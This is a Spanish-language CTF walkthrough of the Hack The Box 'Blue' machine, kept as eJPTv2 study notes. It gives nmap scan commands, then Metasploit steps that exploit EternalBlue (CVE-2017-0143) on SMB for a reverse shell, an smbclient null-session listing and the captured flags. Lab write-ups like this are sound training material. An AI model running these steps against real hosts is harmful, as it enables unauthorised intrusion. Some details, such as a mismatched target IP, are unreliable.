- --
- Tags: #ejptmachine #metasploit #eternalblue
--- --
### ¿Qué habilidades puedes practicar con Blue?

1. **Reconocimiento de servicios y enumeración:**
    - El **escaneo de puertos** con **Nmap** es el primer paso para identificar los servicios activos en la máquina.
    - **Blue** te proporcionará la oportunidad de practicar el **descubrimiento de servicios comunes** en un sistema Windows, como **SMB** y **FTP**, lo cual es bastante común en máquinas de **pentesting** y se evalúa en la **eJPTv2**.
    - También aprenderás cómo realizar la **enumeración de directorios** en servicios como **FTP** o **SMB**, algo muy útil para encontrar archivos importantes o contraseñas.
2. **Explotación de vulnerabilidades en Windows:**
    - **Blue** se basa en un **servicio SMB vulnerable** y la máquina se puede explotar aprovechando una **contraseña débil** o **credenciales** mal configuradas.
    - Esto es relevante para la eJPTv2, donde se evalúa la capacidad de encontrar y explotar vulnerabilidades comunes en servicios expuestos.
3. **Escalada de privilegios en Windows:**
    - Después de obtener acceso inicial, deberás realizar una **escalada de privilegios en Windows**, que es un paso crucial en la mayoría de los pentests.
    - Esto implica buscar archivos, configuraciones o vulnerabilidades en **Windows** que permitan aumentar tus privilegios a **Administrador** o **Sistema**.

---

`nmap -p- -sV -sC --open -sS -vvv -n -Pn 10.10.11.116 -oN escaneo`
![Pasted image 20241123212931](../../Fotos/Pasted%20image%2020241123212931.png)
- 445/tcp   open  microsoft-ds syn-ack ttl 127 Windows 7 Professional

`nmap --script vuln -p445 10.10.10.40`
![Pasted image 20241123213401](../../Fotos/Pasted%20image%2020241123213401.png)
- RCE

`search CVE:CVE-2017-0143`
- Buscamos la vulnerabilidad con metasploit
![Pasted image 20241123213627](../../Fotos/Pasted%20image%2020241123213627.png)
- Confirmamos que el RCE se logra mediante la vulnerabilidad ETERNAL BLUE

![Pasted image 20241123213741](../../Fotos/Pasted%20image%2020241123213741.png)

use 0
![Pasted image 20241123213801](../../Fotos/Pasted%20image%2020241123213801.png)

![Pasted image 20241123213823](../../Fotos/Pasted%20image%2020241123213823.png)

`set RHOSTS 10.10.10.40`
`show payloads`
`set payload 59` 
- Es  a elegir ya que si tenemos alguna reverse shell deficiente o incomoda podemos usar otro payload y listo aunque no todas abrirán la sesión.

`set LHOST 10.10.14.6`
- interfaz de htb
![Pasted image 20241123214621](../../Fotos/Pasted%20image%2020241123214621.png)

`run`
![Pasted image 20241123214716](../../Fotos/Pasted%20image%2020241123214716.png)

`Maquin Vulnerada`

![Pasted image 20241123214756](../../Fotos/Pasted%20image%2020241123214756.png)
- Somos root

user flag: 38b95f0d54485d1af26b0bf0073c2657
root flag: fb34ad99cec01c7e2d5f9a7661bd326d

para ver recursos compartidos smb
`smbclient -L \\10.10.10.40`
- Desde maquina atacante, si pide contraseña daremos enter para hacer runa null sesion


---

![Pasted image 20251227170911](../../Fotos/Pasted%20image%2020251227170911.png)
- Mejora la shell a meterpreter para obtener una consola mas potente en este caso

flag1.txt /s

![Pasted image 20251227170657](../../Fotos/Pasted%20image%2020251227170657.png)





`